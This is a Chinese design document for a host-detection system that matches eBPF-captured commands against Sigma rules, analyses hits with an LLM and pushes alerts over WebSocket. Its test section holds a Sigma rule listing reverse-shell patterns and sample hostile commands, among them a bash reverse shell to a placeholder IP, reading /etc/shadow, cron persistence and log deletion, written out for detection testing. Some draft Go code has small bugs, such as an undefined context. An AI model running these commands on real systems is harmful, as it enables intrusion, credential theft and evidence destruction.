# Agent异常命令上报功能完整实现设计文档

**日期**: 2026-03-23
**版本**: 1.0
**状态**: 已确认

---

## 1. 概述

### 1.1 目标
实现Agent上报异常命令的完整端到端流程，包括：
- Sigma规则由Backend下发到Agent
- Agent通过eBPF采集命令执行事件并匹配规则
- 匹配的事件上报到Backend
- Backend通过LLM分析生成告警
- 前端实时显示告警

### 1.2 测试环境
- 部署方式：本地Docker
- 事件采集：真实eBPF
- 规则来源：开源Sigma规则库
- LLM服务：已有配置

---

## 2. 实现缺口分析

### 2.1 发现的缺口

| 组件 | 缺失功能 | 文件位置 |
|------|----------|----------|
| Backend事件处理 | ReportEvent只记录日志，未发送到Kafka | `backend/internal/grpc_server/server.go:342-351` |
| Backend规则分发 | Agent连接时不会自动推送规则 | `backend/internal/grpc_server/server.go:108-184` |
| Backend规则API | 缺少规则创建/导入API | `backend/internal/api/handler/` |
| 前端WebSocket | 没有实时告警推送 | `frontend/src/` |

### 2.2 修复策略
1. 修改ReportEvent发送事件到Kafka
2. 在Agent注册后推送规则
3. 添加规则管理API
4. 实现WebSocket告警推送

---

## 3. 后端实现设计

### 3.1 ReportEvent修复

**文件**: `backend/internal/grpc_server/server.go`

```go
// 修改后的ReportEvent方法
func (s *GRPCServer) ReportEvent(ctx context.Context, req *pb.ReportEventRequest) (*pb.ReportEventResponse, error) {
    logger.Info("events received",
        zap.String("host_id", req.HostId),
        zap.Int("event_count", len(req.Events)))

    // 发送每个事件到Kafka raw-events topic
    for _, event := range req.Events {
        if err := s.kafkaProducer.SendRawEvent(ctx, req.HostId, event); err != nil {
            logger.Error("failed to send event to kafka",
                zap.String("event_id", event.EventId),
                zap.Error(err))
            continue
        }
    }

    return &pb.ReportEventResponse{
        Success:       true,
        ReceivedCount: int32(len(req.Events)),
    }, nil
}
```

**依赖注入**: GRPCServer需要添加kafkaProducer字段

### 3.2 规则分发机制

**触发时机**:
1. Agent注册成功后 → 全量推送
2. 规则状态变更时 → 广播推送

**实现**: 在Register方法中增加规则分发逻辑

```go
func (s *GRPCServer) Register(ctx context.Context, req *pb.RegisterRequest) (*pb.RegisterResponse, error) {
    // ... 现有注册逻辑 ...
    
    // 注册成功后推送规则
    if resp.Success {
        go s.pushRulesToAgent(hostID)
    }
    
    return resp, nil
}

func (s *GRPCServer) pushRulesToAgent(hostID uuid.UUID) {
    // 等待双向流建立
    time.Sleep(1 * time.Second)
    
    conn, ok := s.agentConnections.Load(hostID)
    if !ok {
        logger.Warn("agent connection not ready for rule push", zap.String("host_id", hostID.String()))
        return
    }
    
    // 获取所有active/experimental规则
    rules, err := s.sigmaRuleRepo.GetActiveAndExperimental()
    if err != nil {
        logger.Error("failed to get rules for push", zap.Error(err))
        return
    }
    
    // 构造更新请求
    updates := make([]*pb.RuleUpdate, 0, len(rules))
    for _, rule := range rules {
        updates = append(updates, &pb.RuleUpdate{
            RuleId:  rule.RuleID,
            Action:  "add",
            Content: rule.Content,
        })
    }
    
    // 发送到Agent
    agentConn := conn.(*AgentConnection)
    _, err = agentConn.Client.UpdateRules(ctx, &pb.RuleUpdateRequest{
        Action: "full_sync",
        Rules:  updates,
    })
    
    if err != nil {
        logger.Error("failed to push rules to agent", zap.Error(err))
    } else {
        logger.Info("rules pushed to agent",
            zap.String("host_id", hostID.String()),
            zap.Int("rule_count", len(rules)))
    }
}
```

### 3.3 规则管理API

**新增路由**: `backend/internal/api/handler/detection_handler.go`

| 方法 | 路径 | 功能 |
|------|------|------|
| POST | `/api/v1/detection/rules` | 创建单个规则 |
| POST | `/api/v1/detection/rules/import` | 批量导入YAML规则 |

**导入API实现**:

```go
func (h *DetectionHandler) ImportRules(c *gin.Context) {
    file, _, err := c.Request.FormFile("file")
    if err != nil {
        c.JSON(400, gin.H{"error": "no file uploaded"})
        return
    }
    defer file.Close()
    
    content, _ := io.ReadAll(file)
    
    // 解析多个YAML规则（用---分隔）
    var rules []model.SigmaRule
    decoder := yaml.NewDecoder(bytes.NewReader(content))
    for {
        var rule model.SigmaRule
        if err := decoder.Decode(&rule); err == io.EOF {
            break
        } else if err != nil {
            c.JSON(400, gin.H{"error": err.Error()})
            return
        }
        rule.Status = "pending"
        rule.GeneratedBy = "import"
        rules = append(rules, rule)
    }
    
    // 批量插入
    for _, rule := range rules {
        h.sigmaRuleRepo.Create(&rule)
    }
    
    c.JSON(200, gin.H{"imported": len(rules)})
}
```

---

## 4. Agent端设计

### 4.1 规则接收（已实现）

Agent端规则接收已在 `client.go` 中实现，需验证：
- 双向流建立后能接收规则更新
- 本地存储路径 `/etc/aegis-agent/rules/` 可写
- Agent重启后能从磁盘加载规则

### 4.2 启动时请求规则同步

**增强方案**: 在connect()成功后主动请求规则

```go
func (c *Client) connect() error {
    // ... 现有连接逻辑 ...
    
    // 连接成功后请求规则同步
    go c.requestRuleSync()
    
    return nil
}

func (c *Client) requestRuleSync() {
    time.Sleep(2 * time.Second)  // 等待双向流完全建立
    
    ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
    defer cancel()
    
    resp, err := c.client.UpdateRules(ctx, &pb.RuleUpdateRequest{
        Action: "full_sync",
    })
    
    if err != nil {
        logger.Warn("failed to request rule sync", zap.Error(err))
    } else {
        logger.Info("rule sync requested", zap.Int32("loaded", resp.LoadedCount))
    }
}
```

---

## 5. WebSocket告警推送设计

### 5.1 后端WebSocket服务

**新文件**: `backend/internal/service/websocket_service.go`

```go
package service

import (
    "aegis-system/internal/model"
    "github.com/gorilla/websocket"
    "go.uber.org/zap"
)

type WebSocketService struct {
    clients   map[*websocket.Conn]bool
    broadcast chan *model.Alert
    logger    *zap.Logger
}

func NewWebSocketService() *WebSocketService {
    return &WebSocketService{
        clients:   make(map[*websocket.Conn]bool),
        broadcast: make(chan *model.Alert, 100),
    }
}

func (s *WebSocketService) BroadcastAlert(alert *model.Alert) {
    select {
    case s.broadcast <- alert:
    default:
        s.logger.Warn("broadcast channel full, dropping alert")
    }
}

func (s *WebSocketService) Run() {
    for alert := range s.broadcast {
        for conn := range s.clients {
            if err := conn.WriteJSON(alert); err != nil {
                conn.Close()
                delete(s.clients, conn)
            }
        }
    }
}

func (s *WebSocketService) RegisterClient(conn *websocket.Conn) {
    s.clients[conn] = true
}

func (s *WebSocketService) UnregisterClient(conn *websocket.Conn) {
    delete(s.clients, conn)
    conn.Close()
}
```

### 5.2 前端WebSocket连接

**新文件**: `frontend/src/utils/websocket.ts`

```typescript
export interface Alert {
  alert_id: string;
  host_id: string;
  mitre_id: string;
  severity: string;
  description: string;
}

type AlertCallback = (alert: Alert) => void;

class AlertWebSocket {
  private ws: WebSocket | null = null;
  private reconnectAttempts = 0;
  private maxReconnectAttempts = 5;
  
  connect(onAlert: AlertCallback): void {
    const wsUrl = `${location.protocol === 'https:' ? 'wss:' : 'ws:'}//${location.host}/api/v1/ws/alerts`;
    
    this.ws = new WebSocket(wsUrl);
    
    this.ws.onopen = () => {
      console.log('WebSocket connected');
      this.reconnectAttempts = 0;
    };
    
    this.ws.onmessage = (event) => {
      const alert = JSON.parse(event.data) as Alert;
      onAlert(alert);
    };
    
    this.ws.onclose = () => {
      if (this.reconnectAttempts < this.maxReconnectAttempts) {
        this.reconnectAttempts++;
        setTimeout(() => this.connect(onAlert), 3000);
      }
    };
  }
  
  disconnect(): void {
    if (this.ws) {
      this.ws.close();
      this.ws = null;
    }
  }
}

export const alertWebSocket = new AlertWebSocket();
```

---

## 6. Sigma规则与测试命令

### 6.1 测试用Sigma规则

```yaml
title: Suspicious Reverse Shell Command
id: aegis-reverse-shell-001
status: experimental
description: Detects common reverse shell patterns in command line
logsource:
  category: process_creation
  product: linux
detection:
  selection:
    commandline|contains:
      - '/bin/bash -i'
      - 'nc -e'
      - '/dev/tcp/'
      - 'python -c.*socket'
      - 'perl -e.*socket'
  condition: selection
level: critical
tags:
  - attack.t1059.004
  - attack.execution
```

### 6.2 测试用恶意命令

```bash
# 反弹Shell (T1059.004)
/bin/bash -c '/bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'

# 提权尝试 (T1548)
find / -perm -4000 2>/dev/null

# 凭据收集 (T1003)
cat /etc/shadow

# 持久化 (T1053)
(crontab -l; echo "* * * * * id") | crontab -

# 防御规避 (T1070)
rm -f /var/log/auth.log
```

---

## 7. 端到端验证流程

### 7.1 构建部署

```bash
# 构建Agent
cd agent && make bpf && make build

# 构建Backend
cd backend && make build

# 构建镜像并部署
docker-compose build
docker-compose up -d
```

### 7.2 验证检查清单

| 步骤 | 检查项 | 验证方法 |
|------|--------|----------|
| 1 | 规则导入 | `curl -F "file=@rules.yml" localhost:8080/api/v1/detection/rules/import` |
| 2 | Agent收到规则 | 检查 `/etc/aegis-agent/rules/*.yml` |
| 3 | eBPF捕获命令 | Agent日志 "Event captured" |
| 4 | Sigma规则命中 | Agent日志 "Rule matched" |
| 5 | 事件上报成功 | Agent日志 "Events reported" |
| 6 | Kafka消息 | `kafka-console-consumer --topic raw-events` |
| 7 | 窗口聚合 | Backend日志 "event added to window" |
| 8 | LLM分析 | Backend日志 "processing window" |
| 9 | 告警创建 | `SELECT * FROM alerts ORDER BY created_at DESC LIMIT 1` |
| 10 | 前端显示 | 告警页面看到新告警 |

---

## 8. 文件修改清单

| 文件 | 修改类型 | 说明 |
|------|----------|------|
| `backend/internal/grpc_server/server.go` | 修改 | ReportEvent发送到Kafka，Register后推送规则 |
| `backend/internal/api/handler/detection_handler.go` | 新增 | ImportRules API |
| `backend/internal/api/router.go` | 修改 | 添加规则导入路由 |
| `backend/internal/service/websocket_service.go` | 新增 | WebSocket告警推送服务 |
| `backend/cmd/server/main.go` | 修改 | 初始化WebSocket服务 |
| `agent/internal/client/client.go` | 修改 | 启动时请求规则同步 |
| `frontend/src/utils/websocket.ts` | 新增 | WebSocket客户端 |
| `frontend/src/views/detection/Alerts.vue` | 修改 | 集成WebSocket监听 |

---

## 9. 后续工作

1. 实现上述所有代码修改
2. 准备Sigma规则文件
3. 编写测试脚本
4. 执行端到端测试验证
5. 进行代码审查

---

**文档完成日期**: 2026-03-23